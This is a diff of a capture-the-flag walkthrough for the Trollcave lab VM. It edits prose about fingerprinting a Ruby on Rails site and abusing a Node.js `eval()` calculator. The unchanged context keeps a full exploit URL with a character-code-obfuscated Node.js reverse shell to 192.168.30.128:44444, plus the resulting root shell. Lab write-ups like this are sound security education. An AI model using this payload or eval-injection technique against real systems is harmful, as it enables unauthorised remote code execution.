@@ -84,11 +84,11 @@ ID	Response   Lines      Word         Chars          Payload
 018906:  C=302      0 L	       5 W	     93 Ch	  "users"
 ```
 
-All those with HTTP response code `302` redirects to `/login`. The rest of the HTTP response code `200` redirects to their respective error pages, e.g. `/404` redirects to `/404.html`.
+The ones with the HTTP response code `302` redirect to `/login`. The top three with the HTTP response code `200` redirect to their respective error pages, e.g. `/404` redirects to `/404.html`.
 
 ### Ruby on Rails
 
-I notice [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs during my cursory browsing of the site, and I believe it's a RoR web application.
+I notice [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs during my cursory browsing of the site, which looks a lot like a RoR web application.
 
 ```
 # curl -s http://192.168.30.128/ | grep -Po '(href|src)=".{2,}"' | cut -d'"' -f2 | sort | uniq
@@ -116,7 +116,7 @@ I notice [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)fu
 /users/5
 ```
 
-I read the blog post at `/blogs/6 and it says something about "a resource in rails", I believe it's saying the site is a RoR web application. OK, and check out the ruby avatar too; at least now we know what we are dealing with.
+I come across a blog post at `/blogs/6 and it says something about "a resource in rails" which further lends support that the site is indeed a RoR web application. OK, check out the ruby avatar too; at least now we know what we are dealing with.
 
 _Image shows that the site is a RoR web application._
 
@@ -310,7 +310,7 @@ If I've to guess, I say this is the way to gain `root` privileges since King is 
 
 ![screenshot-19](/assets/images/posts/trollcave-walkthrough/screenshot-19.png)
 
-It's interesting to note that this application is using `eval()`, which I now believe firmly, is our golden ticket.
+It's interesting to note that this application is using `eval()`. Now, there's no doubt that `eval()` is our golden ticket.
 
 ![screenshot-21](/assets/images/posts/trollcave-walkthrough/screenshot-21.png)
 
@@ -354,7 +354,7 @@ The final exploit URL looks like this.
 http://localhost:9999/calc?sum=eval(String.fromCharCode(32,40,102,117,110,99,116,105,111,110,40,41,123,32,118,97,114,32,114,101,113,117,105,114,101,32,61,32,103,108,111,98,97,108,46,114,101,113,117,105,114,101,32,124,124,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,59,32,105,102,32,40,33,114,101,113,117,105,114,101,41,32,114,101,116,117,114,110,59,32,118,97,114,32,99,109,100,32,61,32,40,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,112,108,97,116,102,111,114,109,46,109,97,116,99,104,40,47,94,119,105,110,47,105,41,41,32,63,32,34,99,109,100,34,32,58,32,34,47,98,105,110,47,115,104,34,59,32,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,34,110,101,116,34,41,44,32,99,112,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,44,32,117,116,105,108,32,61,32,114,101,113,117,105,114,101,40,34,117,116,105,108,34,41,44,32,115,104,32,61,32,99,112,46,115,112,97,119,110,40,99,109,100,44,32,91,93,41,59,32,118,97,114,32,99,108,105,101,110,116,32,61,32,116,104,105,115,59,32,118,97,114,32,99,111,117,110,116,101,114,61,48,59,32,102,117,110,99,116,105,111,110,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,32,61,32,110,101,116,46,99,111,110,110,101,99,116,40,52,52,52,52,52,44,32,34,49,57,50,46,49,54,56,46,51,48,46,49,50,56,34,44,32,102,117,110,99,116,105,111,110,40,41,32,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,32,105,102,32,40,116,121,112,101,111,102,32,117,116,105,108,46,112,117,109,112,32,61,61,61,32,34,117,110,100,101,102,105,110,101,100,34,41,32,123,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,101,108,115,101,32,123,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,111,117,116,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,101,114,114,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,125,41,59,32,115,111,99,107,101,116,46,111,110,40,34,101,114,114,111,114,34,44,32,102,117,110,99,116,105,111,110,40,101,114,114,111,114,41,32,123,32,99,111,117,110,116,101,114,43,43,59,32,105,102,40,99,111,117,110,116,101,114,60,61,32,49,48,41,123,32,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,32,123,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,125,44,32,53,42,49,48,48,48,41,59,32,125,32,101,108,115,101,32,112,114,111,99,101,115,115,46,101,120,105,116,40,41,59,32,125,41,59,32,125,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,32,125,41,40,41,59,49,43,49,59,10))`
 ```
 
-On my `netcat` listener, a shell returns and I can `sudo` as `root`.
+A shell returns on my `netcat` listener and I can `sudo` as `root`.
 
 ![screenshot-23](/assets/images/posts/trollcave-walkthrough/screenshot-23.png)
 
@@ -362,7 +362,7 @@ On my `netcat` listener, a shell returns and I can `sudo` as `root`.
 
 ### Afterthought
 
-This was the perfect opportunity to explore [Ruby on Rails](https://en.wikipedia.org/wiki/Ruby_on_Rails) and [Node.js](https://en.wikipedia.org/wiki/Node.js). I've heard positive reviews from the **webdev** community but never got the chance to go deeper until now; not that I'm using them professionally though.
+This is the perfect opportunity to explore [Ruby on Rails](https://en.wikipedia.org/wiki/Ruby_on_Rails) and [Node.js](https://en.wikipedia.org/wiki/Node.js). I've heard positive reviews from the **webdev** community but never got the chance to go deeper until now; not that I'm using them professionally though.
 
 I rate this VM highly educational and fun.
 
